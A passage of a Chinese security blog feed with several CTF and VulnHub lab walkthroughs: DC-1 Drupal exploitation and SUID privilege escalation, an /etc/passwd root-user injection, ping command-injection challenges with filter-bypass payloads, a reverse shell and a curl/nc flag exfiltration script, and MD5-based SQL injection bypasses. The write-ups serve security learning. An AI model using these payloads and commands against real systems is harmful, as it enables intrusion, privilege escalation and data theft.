data-original="https://img-blog.csdnimg.cn/2020061321144324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>那我们可以添加一个权限为0的用户到/etc/passwd文件中去，拿到最后的falg</p><pre><code>echo 'hfn:$1$xyz$X11iz6ox24iPDed6detyU.:0:0:root:/root:/bin/bash' | sudo teehee -a /etc/passwd</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613211225330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnub-dc-1</title>
      <link href="/posts/79a2a2e8.html"/>
      <url>/posts/79a2a2e8.html</url>
      
        <content type="html"><![CDATA[<p>靶机地址: <a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a>.</p><p>知识点</p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap扫描局域网内存活的主机，发现靶机的ip</p><pre><code>nmap 192.168.88.0/24 -T4</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601205419194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>用nmap进行更加详细的扫描，发现靶机开了以下的几个端口<a id="more"></a>)</p><pre><code>nmap 192.168.88.137 -T4 -A -sV -p-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601210032323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="durpalCMS"><a href="#durpalCMS" class="headerlink" title="durpalCMS"></a>durpalCMS</h1><p>端口：22    ——&gt;爆破 ——&gt;未成功</p><pre><code>hydra -l root -P rockyou.txt 192.168.88.137 ssh</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601210358839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>端口：80 ——&gt;web漏洞——&gt;成功</p><p>指纹识别,是drupal 7</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601210952789.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060121185557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>扫描目录，得到后台地址和robots.txt文件，但爆破后台失败，发现无可利用的点。</p><pre><code>./dirsearch.py --url http://192.168.88.137 -e php</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601212610160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>把思路转向Metasploit,在kali中寻找该CMS的版本漏洞,因exp太多，不知道该用哪一个所以在msf中查找一下，把范围缩小</p><pre><code>searchsploit drupal 7</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601213226189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>search drupal</code></pre><p>在这里我们用第四个exp，成功拿到shell(一个一个试)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601215823322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601220205716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>shellpython -c "import pty;pty.spawn('/bin/bash')"</code></pre><p>得到一个交互式的shell，在www目录下找到第一个flag，也提示了下一个flag和配置文件有关</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601220653531.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602074706567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>百度可知drupal的数据库配置文件路径，也在数据库配置文件中拿到了第二个flag和一对帐号密码<br> dbuser:R0ck3t</p><p> 百度可知drupal的数据库配置文件路径<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601221857639.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601221948380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="数据库改密"><a href="#数据库改密" class="headerlink" title="数据库改密"></a>数据库改密</h1><p>用已知的数据库帐号密码进行登录，修改网站管理员的密码，达到登录后台的方法。<br>drupal的hash加密方法参考以下链接： <a href="drupalchina.cn/node/2128">drupalchina.cn/node/2128</a>.</p><p>password: password          hash:     </p><pre><code>update users set update users set pass='$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4'  where name='admin';</code></pre><p>用admin：password登录后台，在content左下角发现第三个flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601234742127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601234929801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>根据提示查看当前主机的用户，发现只有一个用户flag4,试着爆破一下，发现爆破成功。<br>用户名密码lag4：orange。登录到主机发现第四个flag，通过第四个flag知道最后一个flag在root目录下，也就是要拿到root权限。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060122251819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601224217116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601233012178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="suid之find提权"><a href="#suid之find提权" class="headerlink" title="suid之find提权"></a>suid之find提权</h1><p>寻找可提权的信息，没有sudo也没有定时任务，但找到了find的suid权限，可通过find提权至root。</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060123325159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>touch 1find 1 -exec "/bin/sh" \; </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601233758747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>至此五个flag已经全部拿到。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF--[第二章 web进阶]死亡ping命令</title>
      <link href="/posts/49a2a2e8.html"/>
      <url>/posts/49a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF–-第二章-web进阶-死亡ping命令"><a href="#BUUCTF–-第二章-web进阶-死亡ping命令" class="headerlink" title="BUUCTF–[第二章 web进阶]死亡ping命令"></a>BUUCTF–[第二章 web进阶]死亡ping命令</h1><p>本文只是对官方wp进行了一点修改，因为在测试过程中发现8080端口弹不回flag，在本地测试也是一样的结果，但是把端口修改成8089，其他端口应该也可以,并且nc监听方式为：nc -lvp 8089。</p><p>开启环境发现是一个ping的页面，通过ping可以发现是存在一些黑名单过滤的，被拦截时候显示IP包含恶意字符。</p><p>利用fuzz的方式能够知道过滤了以下字符:</p><pre><code>["$", "{", "}", "`", ";", "&amp;", "|", "(", ")", "\"", "'", "~", "!", "@", "#", "%", "^", "*", "[", "]", "\\", ":", "-", "_"];</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113125730194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>通过%0a能够注入新的一条命令进行执行。<a id="more"></a></p><pre><code>ip=127.0.0.1%0als</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113130453949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>由于docker是没有bash、python程序的，并且sh反弹是不行的。</p><pre><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1</code></pre><p>目前是能通过折中的方式执行任意命令，用小号在BUU上开一个内网的主机</p><p>编写1.sh，内容如下：</p><pre><code>lscat /FLAG | nc your_buu_ip 8089</code></pre><p>把他复制到网站根目录<br>在靶机上用curl下载</p><pre><code>127.0.0.1%0acurl your_buu_ip/1.sh &gt; /tmp/1.sh   #请求bash文件到tmp目录</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113131141955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>127.0.0.1%0achmod 777 /tmp/1.sh #给bash加权限</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113131259518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>nc -lvp 8089  #your_buu_ip的机器上进行监听8089端口</code></pre><pre><code>127.0.0.1%0ash /tmp/1.sh #执行bash文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113131407737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><a href="http://mirrors.ren/" target="_blank" rel="noopener">个人博客，欢迎来踩~</a>.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ping Ping Ping</title>
      <link href="/posts/19d2a2e8.html"/>
      <url>/posts/19d2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>现在做一下关于常见的绕过ping执行其他命令的姿势，启动环境，连接并输入参数，查看当前目录下都有什么<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108114711565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt="">)<a id="more"></a>)</p><p>ls命令没有被过滤，并且知道flag就在这个目录下面，用cat查看的flag的时候发现空格被禁用，绕过空格常用的方法有</p><pre><code>{cat,flag.php} cat${IFS}flag.phpcat$IFS$9flag.phpcat&lt;flag.phpcat&lt;&gt;flag.phpkg=$'\x20flag.php'&amp;&amp;cat$kga=c;b=at;c=flag.php;$a$b $cb=ag;a=fl;cat$IFS$1$a$b.phpecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|shecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bashecho$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code></pre><p>要是禁用cat的话可以用less、more、tac、ca\t等绕过</p><p>具体效果如下</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108120121242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108120537576.png#pic_center" alt=""><br>在这题中试了好几个，试到第三个的时候发现有回显</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108121208333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>查看源码的时候发现已经绕过，查看当前目录的所有文件的内容。（今年强网杯也出现了这个姿势）</p><pre><code>cat `ls`cat *</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108121829796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>强网杯<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108122046413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>当然也还有其他的姿势，不过我们先分析源码</p><pre><code>/?ip=&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes&lt;?php$flag = "flag{f273e20f-2a0f-4914-9961-5acc4026f7f5}";?&gt;/?ip=&lt;?phpif(isset($_GET['ip'])){  $ip = $_GET['ip'];  if(preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);    die("fxck your symbol!");  } else if(preg_match("/ /", $ip)){    die("fxck your space!");  } else if(preg_match("/bash/", $ip)){    die("fxck your bash!");  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){    die("fxck your flag!");  }  $a = shell_exec("ping -c 4 ".$ip);  echo "&lt;pre&gt;";  print_r($a);}?&gt;</code></pre><p>第一关是过滤掉一些特殊符号像：\、&amp;、{、}、&lt;、&gt;、*等这些</p><pre><code> if(preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match))</code></pre><p>所以我们只能用没有被过滤的符号组成payload</p><p>第二关是过滤了空格</p><pre><code> if(preg_match("/ /", $ip))</code></pre><p>可以用 $IFS$9 来绕过</p><p>第三关是过滤了bash</p><pre><code> if(preg_match("/bash/", $ip))</code></pre><p>可以用  echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 来绕过，这句话的意思是先把cat flag.php 进行base64加密然后解密再用sh执行并把结果输入出来</p><p>第四关是匹配一个字符串中，是否按顺序出现过flag四个字母</p><pre><code> if(preg_match("/.*f.*l.*a.*g.*/", $ip))</code></pre><p>可以采用字符串拼接 b=ag;a=fl;cat$IFS$1$a$b.php 让他不按顺序出现就好</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy MD5</title>
      <link href="/posts/19d2a4e8.html"/>
      <url>/posts/19d2a4e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>取自[BJDCTF2020]Easy MD5+[安洵杯 2019]easy_web的两道md5绕过。<br>进去是一个提交数据的页面，随便写一个数据然后抓包重发，发现提示</p><pre><code>Hint: select * from 'admin' where password=md5($pass,true)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/XingHe0/img/post/20201107212852404.png" alt=""></p><p>确定为sql注入，并且得绕过：md5($pass,true)</p><p>查查其他师傅的wp知道该函数的用法即绕过方式</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107213549717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><a href="https://www.jianshu.com/p/c5b05c766906" target="_blank" rel="noopener">师傅</a>说这个可以用ffifdyop绕过，绕过原理是：ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6，而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password=’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5($pass,true)函数（今年的强网杯也用到了这个方法）。</p><p>payload：</p><pre><code>?password=ffifdyop</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107214333451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>进入到一个新的页面，get两个参数，要求值不相等，但是md5值要相等，是md5的弱类型绕过，用数组就好,md5不能处理数组。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107231114578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>payload</p><pre><code>?a[]=1&amp;b[]=2</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107214714869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>又进入一个新的页面，这下是md5的强类型绕过，因为没有要求是否是字符串，所以仍然可以用数组来进行绕过。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107220441994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>当然也可以使用特殊的字符串来绕过，之间有保存过利用的字符串，现在就直接利用了。</p><pre><code>param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107220416501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>他们经过url解码后的MD5值相等<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107221541399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>  [安洵杯 2019]easy_web<br>  多了string,不能用数组绕过了，只能这样子绕过<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201107230417733.png#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      